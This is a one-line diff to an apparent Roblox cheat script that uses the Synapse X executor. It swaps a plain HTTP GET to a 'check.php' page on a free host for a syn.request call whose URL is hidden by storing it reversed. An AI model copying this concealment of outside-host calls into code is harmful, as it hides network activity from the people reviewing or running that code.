@@ -1,1 +1,1 @@
-game:HttpGet("https://thepro1000.000webhostapp.com/check.php", true)
+local Response = syn.request({Url = string.reverse("php.kcehc/moc.ppatsohbew000.0001orpeht//:sptth"),Method = "GET"})
